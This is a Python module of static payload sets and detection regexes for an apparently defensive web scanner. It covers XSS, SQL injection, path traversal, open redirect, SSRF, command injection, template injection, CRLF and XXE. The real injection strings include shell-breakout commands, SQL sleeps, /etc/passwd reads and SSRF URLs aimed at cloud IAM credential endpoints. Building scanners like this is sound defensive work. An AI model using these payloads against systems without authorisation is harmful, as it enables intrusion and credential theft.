"""
The documented, static payload sets for the active-injection detectors (spec 006, RNF-07).

Small and well-known — no mutation engine, no WAF-evasion tuning. ``{token}`` /
``{d}`` / ``{host}`` are substituted by the detector. Signatures are compiled
regexes matched against a response body and required to be *absent from the
baseline*.
"""

from __future__ import annotations

import re

# --- reflected XSS (RF-08) -------------------------------------------------------------

XSS_TOKEN_BYTES = 6
# Sent first: is the parameter reflected at all? (No HTML-significant characters.)
XSS_PROBE = "wv{token}"
# Sent only when the probe reflects. A hit needs the payload back *verbatim* (so `<`, `>`,
# `"` were not entity- or percent-encoded) in an HTML response.
XSS_BREAKERS: tuple[str, ...] = (
    'wv{token}"><svg onload=wv{token}>',
    "wv{token}'></script><script>wv{token}</script>",
    '"><img src=x onerror=wv{token}>',
    "javascript:wv{token}",
)

# --- SQL injection (RF-09) ------------------------------------------------------------

# Error-based: break the quoting and look for a DBMS parser error.
SQLI_ERROR: tuple[str, ...] = ("'", '"', "')", "';", "\\", "' OR '1")

SQL_ERROR_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = (
    (
        "MySQL",
        re.compile(r"SQL syntax.*MySQL|MySqlException|valid MySQL result|MariaDB server", re.I),
    ),
    (
        "PostgreSQL",
        re.compile(r"PSQLException|unterminated quoted string|syntax error at or near", re.I),
    ),
    (
        "MSSQL",
        re.compile(r"Unclosed quotation mark|Incorrect syntax near|System\.Data\.SqlClient", re.I),
    ),
    ("Oracle", re.compile(r"ORA-0\d{4}|quoted string not properly terminated", re.I)),
    (
        "SQLite",
        re.compile(
            r"SQLITE_ERROR|unrecognized token|near \".+?\": syntax error|sqlite3\.OperationalError",
            re.I,
        ),
    ),
)

# Boolean-based: (true, false) appended to the original value. The detector tries each pair
# as a candidate — a real injection makes the TRUE response match the baseline and the
# FALSE response differ. The pairs cover the common quoted and numeric contexts.
SQLI_BOOLEAN_PAIRS: tuple[tuple[str, str], ...] = (
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
    (" AND 1=1", " AND 1=2"),
    (") AND (1=1", ") AND (1=2"),
)

# Time-based: {d} = the configured delay in seconds. One dialect per DBMS; the detector
# stops at the first that reproduces.
SQLI_TIME: tuple[tuple[str, str], ...] = (
    ("MySQL", "' AND SLEEP({d})-- -"),
    ("PostgreSQL", "' || pg_sleep({d})-- -"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("generic", " AND SLEEP({d})"),
)

# --- path traversal / LFI (RF-10) ---------------------------------------------------

TRAVERSAL: tuple[str, ...] = (
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
)

TRAVERSAL_SIGNATURES: tuple[re.Pattern[str], ...] = (
    re.compile(r"root:.*?:0:0:"),
    re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I),
)

# --- open redirect (RF-11) --------------------------------------------------------

# `.invalid` is a guaranteed-unresolvable TLD; the host is never requested (it is out of
# scope, so the scope guard blocks it) — the detector only reads the Location it was sent to.
REDIRECT_SENTINEL = "webvigil.invalid"
REDIRECT_PAYLOADS: tuple[str, ...] = (
    "https://webvigil.invalid/",
    "//webvigil.invalid/",
    "https:/webvigil.invalid",
    "https:\\\\webvigil.invalid",
    "/\\webvigil.invalid",
    "\thttps://webvigil.invalid",
    "https://{host}@webvigil.invalid",
)

# --- stored / persistent XSS (spec 008, RF-04) ------------------------------------

STORED_TOKEN_BYTES = 6
# {token} is a per-point secrets.token_hex, so a marker found on the re-crawl traces back to
# the exact injection point. A hit needs the tag back *verbatim* (`<` and `>` not entity-
# encoded) in an HTML response, on a page other than the one it was submitted to. The tag is
# inert in a browser (no script, no handler, no URL) but unambiguously rendered as an element
# if the app failed to escape it, and it carries `wvstored` so it is attributable to WebVigil
# in the target's data store.
STORED_MARKERS: tuple[str, ...] = (
    "<wvstored{token}>",
    '"><wvstored{token}>',
)

# --- in-band SSRF (spec 009, RF-03..RF-07) --------------------------------------------
#
# The payloads are *parameter values* sent to the target; WebVigil only ever connects to
# the target host — whatever the target then fetches is the target's own doing, observed
# in-band. ``{token}`` is not used here; ``{host}`` is substituted with the target host by
# the detector (the same mechanism the redirect payloads use). A hit always needs a
# signature that is *absent from the point's baseline*.

# Cloud instance-metadata endpoints. A hit needs a provider-specific marker in the body
# (RF-03) — never just the address echoed back.
SSRF_METADATA: tuple[str, ...] = (
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "https://kubernetes.default.svc/",
    "http://2852039166/latest/meta-data/",  # 169.254.169.254 as a decimal integer
    "http://0xA9FEA9FE/latest/meta-data/",  # ...as hex
    "http://{host}@169.254.169.254/latest/meta-data/",  # userinfo confusion
    "http://169.254.169.254#@{host}/latest/meta-data/",  # fragment trick
)

# file:// reads. Proven by a real file-content signature (RF-04), reusing TRAVERSAL_SIGNATURES.
SSRF_FILE: tuple[str, ...] = (
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file://localhost/etc/passwd",
)

# Loopback / link-local / RFC-1918, plus the encodings that slip past a naive string block.
SSRF_INTERNAL: tuple[str, ...] = (
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.1/",
    "http://2130706433/",  # 127.0.0.1 as a decimal integer
    "http://0x7f000001/",  # ...as hex
    "http://0177.0.0.1/",  # ...with an octal first octet
    "http://{host}@127.0.0.1/",
    "http://169.254.169.254/",  # bare link-local as an internal-reach canary
)

# (provider, marker) — matched against a response *body*, required absent from the baseline.
# Markers are chosen to appear in metadata-service responses, never in the payload URLs
# themselves (so an app that merely echoes the injected URL is not a hit — RF-03, ADR-4).
SSRF_METADATA_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = (
    (
        "AWS",
        re.compile(
            r'"AccessKeyId"|"Code"\s*:\s*"Success"|"InstanceProfileArn"|'
            r"\bami-launch-index\b|\bblock-device-mapping\b",
            re.I,
        ),
    ),
    (
        "GCP",
        re.compile(
            r'"machineType"|"cpuPlatform"|"serviceAccounts"|'
            r'"access_token"[\s\S]{0,80}"expires_in"',
            re.I,
        ),
    ),
    ("Azure", re.compile(r'"azEnvironment"|"vmId"|"resourceGroupName"', re.I)),
    ("AliCloud", re.compile(r"\bowner-account-id\b|\bregion-id\b[\s\S]{0,80}\bzone-id\b", re.I)),
    (
        "Kubernetes",
        re.compile(r'"kind"\s*:\s*"Status"[\s\S]{0,200}"(?:forbidden|Forbidden)"', re.I),
    ),
)

# (service, marker) — the distinctive first bytes of common internal services that answer
# an HTTP GET. Required absent from the baseline.
SSRF_INTERNAL_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("Redis", re.compile(r"redis_version:|-DENIED Redis|-NOAUTH Authentication", re.I)),
    ("nginx status", re.compile(r"Active connections:\s*\d+|server accepts handled", re.I)),
    ("Docker API", re.compile(r'"ApiVersion"\s*:|"Containers"\s*:\s*\d+', re.I)),
    ("Elasticsearch", re.compile(r'"cluster_name"\s*:|"lucene_version"\s*:', re.I)),
    (
        "internal HTTP",
        re.compile(
            r"<title>\s*(?:Index of /|401 Authorization Required|Grafana|Kibana|"
            r"phpMyAdmin|Jenkins)",
            re.I,
        ),
    ),
)

# An SSRF-shaped connection error only counts when the response also echoes the injected
# URL (RF-06, ADR-4) and the error is absent from the baseline.
SSRF_ERROR_SIGNATURES: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"Connection refused|No route to host|Network is unreachable|"
        r"Name or service not known|nodename nor servname",
        re.I,
    ),
    re.compile(r"getaddrinfo|ECONNREFUSED|EHOSTUNREACH|ETIMEDOUT|ENETUNREACH", re.I),
    re.compile(
        r"Failed to (?:connect|resolve|open)|could not resolve host|"
        r"unknown url type|unsupported protocol",
        re.I,
    ),
    re.compile(r"certificate verify failed|CERTIFICATE_VERIFY_FAILED", re.I),
    re.compile(r"curl: \(\d+\)", re.I),
    re.compile(r"java\.net\.(?:Connect|UnknownHost|SocketTimeout|MalformedURL)Exception", re.I),
    re.compile(r"requests\.exceptions\.\w+|urllib3?\.exceptions|aiohttp\.client_exceptions", re.I),
)

# --- OS command injection (spec 011, RF-02, RF-03) ------------------------------------
#
# Every payload is a *value* appended to the point's original value. The shell metacharacter
# breaks out of the command the value lands in; ``echo {marker}=$(({a}*{b}))`` then makes the
# shell perform POSIX arithmetic expansion. ``{marker}`` is a per-request ``wv`` + token_hex,
# ``{a}`` / ``{b}`` are random two-digit operands (the detector substitutes all three). A hit
# needs ``{marker}=<a*b>`` (the *evaluated* product) in the response and absent from the
# baseline (ADR-4) — an app that merely reflects the payload sends back the literal
# ``$((a*b))`` and is not a hit.

CMDI_MARKER_BYTES = 6

CMDI_ECHO_POSIX: tuple[str, ...] = (
    ";echo {marker}=$(({a}*{b}))",
    "|echo {marker}=$(({a}*{b}))",
    "||echo {marker}=$(({a}*{b}))",
    "&&echo {marker}=$(({a}*{b}))",
    "&echo {marker}=$(({a}*{b}))",
    "$(echo {marker}=$(({a}*{b})))",
    "`echo {marker}=$(({a}*{b}))`",
    "%0aecho {marker}=$(({a}*{b}))",
    ";echo${{IFS}}{marker}=$(({a}*{b}))",  # space-filtered contexts
    '";echo {marker}=$(({a}*{b}));#',  # break a double-quoted "$var"
    "';echo {marker}=$(({a}*{b}));#",  # break a single-quoted '$var'
)

# Windows cmd.exe: no single self-checking expansion like $((...)), so the proof is a
# two-token match (marker echoed, then `set /a` prints the product) — reported at MEDIUM
# confidence by the detector (ADR-6).
CMDI_ECHO_WINDOWS: tuple[str, ...] = (
    "&echo {marker}&set /a {a}*{b}",
    "|echo {marker}&set /a {a}*{b}",
)

# (label, template) — ``{d}`` = the configured delay in seconds, ``{d1}`` = ``d + 1`` (ping
# wants a packet count). The detector confirms against a ``{d}=0`` control and a half-delay
# probe, exactly like ``SQLI_TIME``.
CMDI_TIME: tuple[tuple[str, str], ...] = (
    ("POSIX", ";sleep {d}"),
    ("POSIX", "$(sleep {d})"),
    ("POSIX", "`sleep {d}`"),
    ("POSIX", "|sleep {d}"),
    ("POSIX", "%0asleep {d}"),
    ("Windows", "&ping -n {d1} 127.0.0.1"),
    ("Windows", "&timeout /t {d}"),
)

# --- server-side template injection (spec 011, RF-05, RF-06) --------------------------
#
# Stage 1 sends ``SSTI_POLYGLOT`` and reads the body for a template-engine parse error.
# Stage 2 sends ``arith_payloads`` (marker glued to an arithmetic expression) and needs
# ``<marker><a*b>`` in the response, absent from the baseline (ADR-4). ``SSTI_ENGINE_PROBE``
# is the optional third request: ``{{7*'7'}}`` renders ``7777777`` on Jinja2/Nunjucks and
# ``49`` on Twig.

SSTI_MARKER_BYTES = 6

# The PortSwigger SSTI polyglot — valid enough in most contexts to draw a parse error
# without evaluating anything.
SSTI_POLYGLOT = "${{<%[%'\"}}%\\"

# ``%s`` is the marker; ``%`` formatting leaves the template braces untouched.
SSTI_ENGINE_PROBE = "%s{{7*'7'}}"

# (engine, pattern) — a parse/render error in the response body, required absent from the
# baseline. A match names the engine and picks its arithmetic payload first.
SSTI_ERROR_SIGNATURES: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("Jinja2", re.compile(r"jinja2\.exceptions|TemplateSyntaxError|TemplateAssertionError", re.I)),
    ("Twig", re.compile(r"Twig\\Error|Twig_Error|Twig\\Environment", re.I)),
    ("Freemarker", re.compile(r"FreeMarker template error|freemarker\.core\.", re.I)),
    ("Velocity", re.compile(r"org\.apache\.velocity|ParseErrorException", re.I)),
    ("Smarty", re.compile(r"Smarty(?:CompilerException|_Compiler_)|Smarty error", re.I)),
    ("Mako", re.compile(r"mako\.exceptions|mako\.runtime", re.I)),
    ("ERB", re.compile(r"\(erb\):\d+|SyntaxError \(\(erb\)\)", re.I)),
    ("Handlebars", re.compile(r"Handlebars.*Parse error|hbs.*Parse error", re.I)),
)


def arith_payloads(marker: str, a: int, b: int) -> tuple[tuple[str, str], ...]:
    """
    Build the stage-2 SSTI arithmetic payloads.

    The marker is glued to the expression so a hit is ``<marker><product>`` in
    the rendered output, never the bare product (ADR-4).

    Args:
        marker (str): The per-request marker (``wv`` + token_hex).
        a (int): First operand.
        b (int): Second operand.

    Returns:
        tuple[tuple[str, str], ...]: ``(engine hint, payload)`` pairs, most
            common engines first.
    """
    return (
        ("Jinja2/Twig", f"{marker}{{{{{a}*{b}}}}}"),  # {marker}{{a*b}}
        ("Freemarker/EL", f"{marker}${{{a}*{b}}}"),  # {marker}${a*b}
        ("ERB/EJS", f"{marker}<%= {a}*{b} %>"),
        ("Groovy/Twig", f"{marker}${{{{{a}*{b}}}}}"),  # {marker}${{a*b}}
        ("Thymeleaf", f"{marker}*{{{a}*{b}}}"),  # {marker}*{a*b}
        ("Razor", f"{marker}@({a}*{b})"),
        ("Smarty", f"{marker}{{{a}*{b}}}"),  # {marker}{a*b}
        ("Slim/Pug", f"{marker}#{{{a}*{b}}}"),  # {marker}#{a*b}
    )


# --- CRLF injection / HTTP response splitting (spec 012, RF-01) ----------------------
#
# The payload is appended to the point's value. A hit needs the injected *header* parsed
# back by ``httpx`` (or the whole response body replaced by the marker) — never a mere
# body-text reflection (ADR-5). ``{header}`` / ``{token}`` are substituted by the detector.

CRLF_TOKEN_BYTES = 6
CRLF_HEADER = "X-WvInjected"

CRLF_PAYLOADS: tuple[str, ...] = (
    "\r\n{header}: {token}",  # raw CR LF — httpx percent-encodes it on the wire
    "%0d%0a{header}: {token}",  # pre-encoded
    "%0D%0A{header}:%20{token}",  # pre-encoded, upper, encoded space
    "\u560a\u560d{header}: {token}",  # unicode-newline trick (some Java stacks)
    "\r\n\r\n{body}",  # double CRLF -> full response body split
    "\r\nSet-Cookie: wv{token}=1",  # response-header (session-fixation) split
)
CRLF_BODY_MARKER = "<html>wv{token}</html>"

# --- XXE / XML external entity (spec 012, RF-04, opt-in) ---------------------------
#
# ``injection.xxe`` re-sends a POST point's body as XML. ``{file}`` is a ``file://`` URL,
# ``{dtd}`` an in-scope URL for the parameter-entity probe (so the scope guard permits the
# fetch attempt; the *error* is the signal, not a successful fetch), ``{token}`` a marker.
# File content is matched by ``TRAVERSAL_SIGNATURES``; a parser error by the regexes below.

XXE_CONTENT_TYPES: tuple[str, ...] = ("application/xml", "text/xml")
XXE_FILES: tuple[str, ...] = ("file:///etc/passwd", "file:///c:/windows/win.ini")
XXE_PAYLOADS: tuple[str, ...] = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{file}">]><r>wv{token}&xxe;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "{dtd}"> %p;]><r>wv{token}</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "A"><!ENTITY b "&a;&a;&a;">]><r>&b;wv{token}</r>',
)

XXE_ERROR_SIGNATURES: tuple[re.Pattern[str], ...] = (
    re.compile(
        r"DOCTYPE is not allowed|DOCTYPE.{0,20}forbidden|DTDs? (?:are|is) not permitted", re.I
    ),
    re.compile(
        r"external (?:entity|DTD|general)|EntityRef|undefined entity|entity .{0,20}not defined",
        re.I,
    ),
    re.compile(
        r"lxml\.etree\.XMLSyntaxError|xmlParseEntity|SAXParseException|ExpatError|"
        r"XMLStreamException|DocumentBuilder",
        re.I,
    ),
    re.compile(r"entit(?:y|ies) expansion|maximum entity|entity expansion limit", re.I),
)
